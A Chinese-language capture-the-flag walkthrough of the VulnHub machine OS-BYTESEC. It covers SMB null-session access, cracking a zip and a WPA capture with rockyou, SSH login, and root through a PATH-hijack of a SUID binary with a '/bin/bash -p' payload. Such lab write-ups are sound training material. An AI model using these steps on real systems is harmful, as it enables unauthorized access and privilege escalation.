# HACKNOS: OS-BYTESEC

2025.02.17 https://www.vulnhub.com/entry/hacknos-os-bytesec,393/

[video](https://www.bilibili.com/video/BV1ZgwoeJE4C/?spm_id_from=333.1387.upload.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT     STATE SERVICE
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2525/tcp open  ms-v-worlds
```

enum4linux-ng -a 192.168.5.40 先看看 445 smb 有没有什么共享出来的，发现 1 个枚举出的用户：smb，2 个 smb 共享路径：`print$、IPC$`。

80 web 首页底部有提示：####################GET#####smb##############free 提示 smb 自由访问，表示可能不需要密码就可以访问。

尝试 smmb 空密码进行登陆：

```
smbmap -H 192.168.5.40 -u smb -p ''

Disk                                                  	Permissions	Comment
----                                                  	-----------	-------
print$                                            	READ ONLY	Printer Drivers
IPC$                                              	NO ACCESS	IPC Service (nitin server (Samba, Ubuntu))
```

print$ 可以读取，smbclient 进行登陆：

```
smbclient //192.168.5.40/print$ -U smb -p

W32ALPHA                            D        0  Mon Oct 21 23:31:47 2019
W32X86                              D        0  Mon Oct 21 23:31:47 2019
W32MIPS                             D        0  Mon Oct 21 23:31:47 2019
W32PPC                              D        0  Mon Oct 21 23:31:47 2019
x64                                 D        0  Mon Oct 21 23:31:47 2019
WIN40                               D        0  Mon Oct 21 23:31:47 2019
IA64                                D        0  Mon Oct 21 23:31:47 2019
COLOR                               D        0  Mon Oct 21 23:31:47 2019
```

现实了一堆文件夹，没什么有用信息。

在尝试读取下 smb 用户的文件夹，空密码登陆：

```
smbclient //192.168.5.40/smb -U smb -p
```

ls 后看到 2 个文件：main.txt 和 safe.zip 将其下载。main.txt 中的内容为 helo，不是 zip 解压密码，尝试 john + rockyou 进行解密，得到解压密码 hacker1 解压后，是一个图片和一个 wireshark 抓包文件。

先看看图片有没有隐写，没发现隐写。在看看那个抓包文件，是一个无线协议抓包文件，尝试使用 ng 进行破解:

```
aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt

KEY FOUND! [ snowflake ]
```

同时发现 SSID 为 blackjax，可能是这个用户的 ssh 登陆密码，尝试登陆端口 2525 ，登陆成功：

```
ssh -p 2525 blackjax@192.168.5.40  # 输入密码 snowflake
```

首先得到了 user flag:

```
blackjax@nitin:~$ cat user.txt
  _    _  _____ ______ _____        ______ _               _____
 | |  | |/ ____|  ____|  __ \      |  ____| |        /\   / ____|
 | |  | | (___ | |__  | |__) |_____| |__  | |       /  \ | |  __
 | |  | |\___ \|  __| |  _  /______|  __| | |      / /\ \| | |_ |
 | |__| |____) | |____| | \ \      | |    | |____ / ____ \ |__| |
  \____/|_____/|______|_|  \_\     |_|    |______/_/    \_\_____|



Go To Root.

MD5-HASH : f589a6959f3e04037eb2b3eb0ff726ac
```

枚举后，发现了一个 suid 文件 /usr/bin/netscan GTFOBins 中没有利用方式。

看看他的源码，使用 strings 先看看可见字符，发现里面使用了 netstat -antp 这里的 netstat 没有使用绝对路径，这里可以 PATH 劫持：

```
echo '/bin/bash -p' > /tmp/netstat
chmod +x /tmp/netstat
export PATH=/tmp:$PATH
/usr/bin/netscan
```

运行后直接得到了 root 权限：

```
root@nitin:/tmp# cd /root
root@nitin:/root# ls
root.txt
root@nitin:/root# cat root.txt
    ____  ____  ____  ______   ________    ___   ______
   / __ \/ __ \/ __ \/_  __/  / ____/ /   /   | / ____/
  / /_/ / / / / / / / / /    / /_  / /   / /| |/ / __
 / _, _/ /_/ / /_/ / / /    / __/ / /___/ ___ / /_/ /
/_/ |_|\____/\____/ /_/____/_/   /_____/_/  |_\____/
                     /_____/
Conguratulation..

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Author : Rahul Gehlaut

Contact : https://www.linkedin.com/in/rahulgehlaut/

WebSite : jameshacker.me
```
